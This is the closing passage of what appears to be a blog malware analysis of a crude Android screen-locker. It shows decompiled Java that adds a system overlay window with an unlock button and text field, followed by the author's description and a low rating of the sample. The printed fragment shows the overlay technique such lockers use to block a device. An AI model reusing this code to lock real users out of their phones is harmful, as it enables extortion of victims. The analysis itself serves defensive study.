</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">52</span><span>                    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">53</span><span>                <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">54</span><span>                <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">this$0</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">f0e1</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">setText</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">55</span><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">56</span><span>        <span style="color:#ff79c6">});</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">57</span><span>        WindowManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">LayoutParams</span> layoutParams <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> WindowManager<span style="color:#ff79c6">.</span><span style="color:#50fa7b">LayoutParams</span><span style="color:#ff79c6">(-</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">2</span><span style="color:#ff79c6">,</span> <span style="color:#bd93f9">2002</span><span style="color:#ff79c6">,</span> <span style="color:#bd93f9">1</span><span style="color:#ff79c6">,</span> <span style="color:#ff79c6">-</span><span style="color:#bd93f9">3</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">58</span><span>        layoutParams<span style="color:#ff79c6">.</span><span style="color:#50fa7b">gravity</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">17</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">59</span><span>        layoutParams<span style="color:#ff79c6">.</span><span style="color:#50fa7b">x</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">60</span><span>        layoutParams<span style="color:#ff79c6">.</span><span style="color:#50fa7b">y</span> <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">61</span><span>        <span style="color:#ff79c6">new</span> View<span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">setBackgroundColor</span><span style="color:#ff79c6">(</span><span style="color:#bd93f9">872349696</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">62</span><span>        <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">windowManager</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">addView</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">myView</span><span style="color:#ff79c6">,</span> layoutParams<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">63</span><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">64</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">65</span><span>    @Override <span style="color:#6272a4">// android.app.Service
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">66</span><span><span style="color:#6272a4"></span>    <span style="color:#8be9fd;font-style:italic">public</span> IBinder <span style="color:#50fa7b">onBind</span><span style="color:#ff79c6">(</span>Intent intent<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">67</span><span>        <span style="color:#ff79c6">return</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">68</span><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">69</span><span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">70</span><span>    <span style="color:#6272a4">/* renamed from: f */</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">71</span><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">m0f</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">72</span><span>        Toast<span style="color:#ff79c6">.</span><span style="color:#50fa7b">makeText</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;Ваш текст&#34;</span><span style="color:#ff79c6">,</span> <span style="color:#bd93f9">0</span><span style="color:#ff79c6">).</span><span style="color:#50fa7b">show</span><span style="color:#ff79c6">();</span> <span style="color:#6272a4">// means your text lmao this is a tutorial made malware
</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">73</span><span><span style="color:#6272a4"></span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">74</span><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>The lock screen window consist of the icon line 34, a button (resources reveal this button is named “Unlock Devices”), an edit text, a red background at line 61. As show bellow</p>
<figure><img src="/images/post3/locked_screen.png" width="250px" height="500px"/>
</figure>

<p>As expected before we see the code this locker malware was made by watching tutorials on how to write an android application written on an android IDE. This was done by someone with no technical skills on android development.</p>
<h3 id="rating">Rating</h3>
<ul>
<li>Difficulty : 1/0</li>
<li>Obfuscation : 0/10</li>
<li>Functionality: 2/10</li>
<li>Overall : 1/10</li>
</ul>

    </div>
    <div class="post-footer">
      <div id="disqus_thread"></div>
<script type="application/javascript">
    window.disqus_config = function () {
    
    
    
    };
    (function() {
        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
            return;
        }
        var d = document, s = d.createElement('script'); s.async = true;
        s.src = '//' + "andr01d-rocks" + '.disqus.com/embed.js';
        s.setAttribute('data-timestamp', +new Date());
        (d.head || d.body).appendChild(s);
    })();
</script>
<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
    </div>
  </article>

    </main>
    <div class="cookie-container">
    <p>
      We use cookies on this website to give you the best experience on our
      site and show you relevant ads. To find out more, read our
      <a href="/privacy">privacy policy</a> and <a href="/cookies">cookie policy</a>. 

      
      <button class="cookie-btn">
        Okay
      </button>
    </p>

  </div>
  <script src="/js/cookie.js"></script>

  </body>
</html>
